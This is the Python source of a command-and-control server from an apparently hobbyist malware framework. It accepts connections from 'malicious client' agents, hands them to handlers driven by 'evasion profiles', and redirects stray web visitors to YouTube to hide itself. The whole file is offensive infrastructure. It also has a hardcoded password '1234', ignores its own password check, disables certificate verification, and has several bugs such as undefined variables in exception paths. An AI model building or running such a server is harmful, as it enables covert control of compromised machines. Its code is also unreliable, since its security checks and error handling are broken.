#!/bin/python3
try:
    import subprocess as sp
    import socket
    import threading
    #import time
    import os
    #import sys
    import random
    import atexit
    from datetime import datetime, timezone
    #import select
    import logging
    import argparse
    #import json
    #import math
    import threading
    import traceback
    import ssl


    # My Modules
    #import json_parser_dev as json_parser

    ## moving off of json_parser
    import DataEngine.JsonHandler as json_parser
    import DataEngine.JsonHandler

    #from DataEngine.RSAEncryptionHandler import Encryptor ##  Not needed, switching to SSL

    import ClientEngine.ClientHandler
    import ClientEngine.MaliciousClientHandler
    import ClientEngine.AuthenticationHandler

    import Comms.CommsHandler

    import Utils.UtilsHandler
    import Utils.KeyGen

except Exception as e:
    print(f"[server.py] Import Error: {e}")
    exit()
    #if not continue_anyways():
        #exit()

#import httpserver.httpserver as httpserver

"""
Argparse settings first in order to be able to change anything
"""
parser = argparse.ArgumentParser()
parser.add_argument('--ip', help="The IP to listen on (0.0.0.0 is a good default", required=True)
parser.add_argument('--port', help="The port to listen on", required=True)
parser.add_argument('--quiet', help="No output to console", action='store_true')
parser.add_argument('--fileserverport', help="what port for the file server", default=80)
parser.add_argument('-c', '--generatekeys', help="ReGen Certs & Keys", action="store_true")
parser.add_argument('--evasionprofile', help="The evasion profile", default="/EvasionProfiles/default.yaml")

## Globals bad. I know
args = parser.parse_args()
ip = args.ip
port = int(args.port)
quiet = args.quiet
fileserverport = args.fileserverport
generate_keys = args.generatekeys
evasion_profile = args.evasionprofile

sys_path = os.path.dirname(os.path.realpath(__file__))
#print(sys_path)

"""
Here's the global Debug + Logging settings. 
Global Debug print to screen will be a setting in the future
"""
if not quiet:
    global_debug = True
else:
    global_debug = False
    
##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
if global_debug:
    logging.getLogger().addHandler(logging.StreamHandler())
    

################
## Initial Handler
################ 
    """
    This is the first thing that friendly, and malicious clients talk to. 
    
    Flow:
    (this is a loop)
    |                      / if header is !_client_! -> (new thread) ServerMaliciousClientHandler                  \                            |
    | Receive connection -> if HTTP request, redirect to website (in this case, youtube)                             | Else: throw logging.warn | Loop
    | (start_server)       \ if header is !_userlogin_!, login handler -> (new thread) ServerFriendlyClientHandler /                            |
    
    """

class ServerSockHandler:
    def __init__(self):
        logging.debug(f"===== Startup | Reference Time (UTC) {datetime.now(timezone.utc)} =====")
        self.server_password = "1234"
        ##Errors relevant to this funtion
        self.Sx01 = "conn_broken_pipe: A pipe was broken"
        self.Sx02 = "Socket Close: The socket was successfully closed"
        self.Sx03 = "Socket Timeout: The socket timed out"
        self.Sx04 = "Socket Permission Error: You most likely don'y have permissions to open a socket"
        self.Sx05 = "Connection Refused, Reset or aborted: "
        self.Sx10 = "client_unkown_input: An unkown input was receieved from the client"
        self.SxXX = "Unkown error: "
        ## Other Values
        self.http_redirect = "https://youtube.com"
        ##== Clients & lists
        self.clients = {}
        self.current_clients = []
        self.friendly_current_clients = []
        self.friendly_clients = {}

        ## init per-client details. these exist so there are no unknown variable errors later
        self.client_type = ""
        self.id = None
        self.message = ""
        self.action = ""
        self.response = ""

        ## Modules
        ## This compiles the JSON schema and returns it
        #bypassing for now. 
        self.json_parser = json_parser.json_ops()

        # generating global priv & pub keys
        #self.encryption = Encryptor(key_length=2048)
        #self.encryption.generate_keys()

        # sanity check that keys got generated
        #print(len(encryption.private_key))
        #print(len(encryption.public_key))

    def start_server(self, ip, port):
        """
        Description: This is the starting point for this class, it listens for connections,
        and passes them off to connection_handler()
                        
        ip (str): The IP for the server to listen on
        port (int): The port for the server to listen on
        """
    ##== Initial Connection (these are server connections, NOT client connetions)
        
    ##!! dev note, in future iterations maybe add a webserver component, using post & get commands instead of this
    ## custom protocol stuff - who knows

    ##### MOVE TO INDEPENDENT FILE ####
        ## return respective items, or just use buffers

        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # this allows the socket to be reelased immediatly on crash/exit
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.ADDR = (ip,port)
            self.server.bind(self.ADDR)
            ## A cleanup function incase of crash/on exit
            atexit.register(self.socket_cleanup)
            logging.debug(f"[Server.start_server() ] Server started, and listening: {self.ADDR}")

            ## starting listener
            self.server.listen()
            self.connection_handler()
        
        ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
        except TimeoutError as e:
            logging.warning(f"{self.Sx03}: \n ERRMSG: {e}\n")
        except PermissionError as e:
            logging.warning(f"{self.Sx04}: \nERRMSG:{e}\n")
        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError) as e:
            logging.warning(f"{self.Sx05}: \nERRMSG:{e}\n")
        except Exception as e:
            logging.warning(f"ERRMSG: {e}\n")
    ##### /END MOVE TO INDEPENDENT FILE ####
                
              
        
    def connection_handler(self):
        """The loop that handles the conections, and passes them off to respective threads/classes
            
        Some notes:
            - This is meant to be run as an infinite listen loop, handling each initial connection before passing it off to its respective threads. If an except is triggered in any function, that
                must return false, as that tells the loop to continue to the next iteration/listening state. There are probably better ways to do this, but for now the return  is simple & works well
            
        """

        ## I kinda wanna name this loop, cascade sounds cool
        while True:
        ##== Initial handling of client
            
            # Cheap & dirty way to flip SSL on when ready
            SSL = False
            if SSL:
                serversocket = self.server_ssl_handler()


            else:
                serversocket = self.server_plaintext_handler()
            
            ## catching socket errors
            if not serversocket:
                    continue

        ##### MOVE TO INDEPENDENT FILE ####
        ##== Parsing the message sent to the server. 
            try:
                # Waiting on client to send followup message
                raw_response_from_client = Comms.CommsHandler.receive_msg(conn=serversocket)

                ## Converting to json. Validation is disabled during dev.
                response_from_client = self.json_parser.convert_and_validate(raw_response_from_client)

                if response_from_client: 
                    client_type    = response_from_client["general"]["client_type"]
                    id             = response_from_client["general"]["client_id"]
                    message        = response_from_client["msg"]["msg_command"]
                    action         = response_from_client["general"]["action"]

                    print(f"DEBUG: MSG Breakdown\n\tclient_type:\t {client_type}\n\tid:\t\t {id}\n\tmessage:\t {message}\n\taction:\t\t {action}\n\n")
                else:
                    print("Nothing recieved from client")

            except Exception as e:
                logging.debug(f"[Server.connection_handler() ] No message, action, type, or id recieved. , error={e}")
                print(traceback.format_exc())

        ##== The decision handler based on the client_type, which can be:
            ## !_clientlogin_!: A malicious client "logging" in
            ## !_userlogin_!: A friendly client trying to log in    
            
            ## == Decisions based on parsed messages
            if action == "!_userlogin_!":
                ## If function returns false, continue the loop. IMO that's the easiest way to handle a failure here
                if not self.userloginhandler(
                    request_from_client=raw_response_from_client,
                    serversocket = serversocket):
                    
                    continue
             
            ## !_client_! handler -- change to AGENT
            elif action == "!_clientlogin_!":
                if not self.agentloginhandler(
                    serversocket = serversocket,
                    raw_response_from_client=raw_response_from_client,
                    id = id
                    ):
                    
                    continue
            
            ## Getting rid of any http traffic that made its way to the c2 server instead of the webserver
            elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                ## I should capture these too and see whos hitting it
                ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
                serversocket.close()
                logging.debug("[Server.connection_handler() ] Recieved HTTP Request to C2 server... closing connection")
                
            else:
                logging.warning(f"[Server.connection_handler() ] Unexpected Connection from {self.client_remote_ip_port}. Action: {action} ")
                serversocket.close()


    def server_ssl_handler(self) -> socket:
        '''
        This function accepts connections, wraps them in SSL, and returns the SSL enabled socket.
        '''
        try:
            non_ssl_conn, addr = self.server.accept()

        ## Getting client id from the client, and the IP address
            ## this var is only used for printing info, not as any 'real' data
            self.client_remote_ip_port = f"{non_ssl_conn.getpeername()[0]}:{non_ssl_conn.getpeername()[1]}"
            logging.debug(f"\n[{self.client_remote_ip_port} -> Server] Accepted Connection from: {self.client_remote_ip_port}")

        # Wrapping socket into SSL socket
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(certfile='server.crt', keyfile='server.key')  # Load server's certificate and private key
            ssl_context.verify_mode = ssl.CERT_NONE  # Do not verify the client's certificate, aka self signed
            ssl_socket = ssl_context.wrap_socket(non_ssl_conn, server_side=True)
            
            return ssl_socket
        except ssl.SSLError as ssle:
            '''
             [SSL: SSLV3_ALERT_CERTIFICATE_UNKNOWN] sslv3 alert certificate unknown (_ssl.c:1129)
                - This error comes from browsers connecting to the server. Can't really get past unless you have your own (legit) certs
            
            [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1129)
                - Old SSL or client does not support SSL
                
            '''
            logging.warning(f"[Server.server_ssl_handler() ] SSL Cert Unkown {self.client_remote_ip_port}\n\t Error Message: {ssle}")

        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            logging.warning(f"[Server.server_ssl_handler() ] Client {self.client_remote_ip_port} disconnected")
            return False
        except FileNotFoundError as fnfe:
            logging.debug(f"[Server.server_ssl_handler() ] Missing a file, either .CRT or .KEY: {type(e)}")

        except Exception as e:
            logging.debug(f"[Server.server_ssl_handler() ] Unkown Error: {type(e)}")
            return False     
  
    def server_plaintext_handler(self) -> socket:
        """Handles plaintext communication. It accepts incoming connections, and returns a socket.

        Returns:
            socket: The socket on which the client is communicating on. 
        """
        try:
            non_ssl_conn, addr = self.server.accept()

        ## Getting client id from the client, and the IP address
            ## this var is only used for printing info, not as any 'real' data
            self.client_remote_ip_port = f"{non_ssl_conn.getpeername()[0]}:{non_ssl_conn.getpeername()[1]}"
            logging.debug(f"\n[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")

            return non_ssl_conn

        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            logging.warning(f"[Server.server_plaintext_handler() ] Client {self.client_remote_ip_port} disconnected")
            return False
        except FileNotFoundError as fnfe:
            logging.debug(f"[Server.server_plaintext_handler()] Missing a file, either .CRT or .KEY: {type(e)}")

        except Exception as e:
            logging.debug(f"[Server.server_plaintext_handler()] Unkown Error: {type(e)}")
            return False

    def socket_cleanup(self):
        """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
        & no errors are run into. Left fairly empty for now, may have more use in the future.
            
        Called by start_server
            """
        try:
            ## closing the connection
            self.server.close()
            logging.debug(self.Sx02)
        except Exception as e:
            logging.warning(f"{self.SxXX}:{e}")  

    def userloginhandler(self, request_from_client, serversocket):
        '''
        This function:
            - Sees if a client has logged in before
            - Checks authentication
            - Creates an instance of FriendlyClientHandler.py
            - Puts that instance in a new thread
        
        '''
        ## needs to be update to full Data.JsonHanlder, etc
        client_json_dict = DataEngine.JsonHandler.json_ops.from_json(request_from_client)

        auth_type   = client_json_dict["general"]["auth_type"]
        password    = client_json_dict["general"]["auth_value"]

        
        if auth_type == "password":
            ClientEngine.AuthenticationHandler.Authentication.validate_password(password)
            cookie = ClientEngine.AuthenticationHandler.Authentication.generate_random_cookie()
            print(f"auth okay, cookie: {cookie}")

            cookie_json = DataEngine.JsonHandler.json_ops.to_json_for_client(msg_value=cookie, msg_content="auth_cookie")
            Comms.CommsHandler.send_msg(conn = serversocket, msg = cookie_json)
            #send cookie back
        
        elif auth_type == "cookie":
            if ClientEngine.AuthenticationHandler.Authentication.validate_cookie(): ## maybe use DB to store cookies?
                print("pass to ClientHandler...")
                #decision_tree()
                
                '''threading.Thread(
                target=self.clients[client_name].handle_client,
                args=(raw_response_from_client, serversocket, id)
                ).start()'''

        else:
            print(f"[ERROR STUFF HERE ] Bad Auth Method attemtped {auth_type}")
            #logging.warning("[ERROR STUFF HERE ] Bad Auth Method attemtped")


    def agentloginhandler(self, serversocket=None, raw_response_from_client=None, id=None):
        '''
        raw_response_from_client(str): The raw string from the client. Needed for the MaliciousClientHandler to write to DB. Bandaid Fix

        serversocket: The socket that this connection is held on.

        id=The ID of the client. Note, this is different than the fullname. Ex: WJEIAZ
        

        This function:
            - Sees if a client has logged in before
            - Creates an instance of MaliciousClientHandler.py
            - Puts that instance in a new thread

        Note, if there is an exception, the function returns to continue on with the conn loop.
        

        ## Bulletproofed as of 07/26/2023
        '''
        if id is None:
            logging.debug("[Server.agentloginhandler()] Client ID is None. Returning False to continue with the next loop iteration")
            return False

        try:

            # Construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
            client_name = "client_" + serversocket.getpeername()[0].replace(".", "_") + "_" + id

            '''
            Explanation: 
                English Translation:
                    If the client is not currently in the current client list, add it, and create a
                    new ServerMaliciousClientHandler object for it.

                    If it is, just call the client class instance from the dict (becuase it already exists), 
                    and start a thread with the relevant details. (i.e. the response from the client, the current socket, and the id)

            '''
            if client_name not in self.current_clients:
                self.current_clients.append(client_name)

                # Create a new malicious client handler instance and add it to the clients dict
                # sys_path & evasion_profile are both globals. evasion_profile is from argparse, and sys_path is defined at startup
                #print(f"SERVER.PY {sys_path} + {evasion_profile}")

                self.clients[client_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler(sys_path=sys_path, evasion_profile_path=evasion_profile)

            # Create a new thread for this client's communication.
            # Passing the response from client, the socket, and the id. 
            threading.Thread(
                target=self.clients[client_name].handle_client,
                args=(raw_response_from_client, serversocket, id)
                ).start()

            logging.debug(f"[Server.agentloginhandler(): {id} ] Client '{id}' accepted, new thread created")

        except KeyError as e:
            logging.debug(f"[Server.agentloginhandler(): {id} ] Missing key in login message: {e}")
            return False

        except Exception as e:
            logging.debug(f"[Server.agentloginhandler(): {id} ] Unknown Error: {e}")
            raise  # Let the exception propagate, don't return False

        return True


def continue_anyways():
    '''
    A little function that propmts the user to continue anyway. Returns true/false. 

    Here as well as in UtilsHandler, incase the import fails
    '''
    if input("Enter 'y' to continue execution (high chance of failure), or any other key to exit: ").lower() == "y":
        return True
    else:
        return False

#if __name__ == "__main__":
if fileserverport == port:
    logging.critical(f"[SERVER] Fileserver ({fileserverport}) & Listenserver ({port}) port are the same. They need to be different ")

#fs_thread = threading.Thread(target=httpserver.fileserver_start, kwargs={'ip': "0.0.0.0",'port': fileserverport})
#fs_thread.start()

#Data.json_create()
try:
    ## Temp file check, will be put  in a func later
    Utils.UtilsHandler.file_check(f"{sys_path}/server.crt")
    
    if generate_keys:
        Utils.KeyGen.ssl_gen(
            save_file_path=sys_path
        )

    s = ServerSockHandler()
    s.start_server(ip, port)
except KeyboardInterrupt as ke:
    print("\n[server.py] Kill Signal received, shutting down")
except Exception as e:
    print(f"[server.py] Error occured: {e}")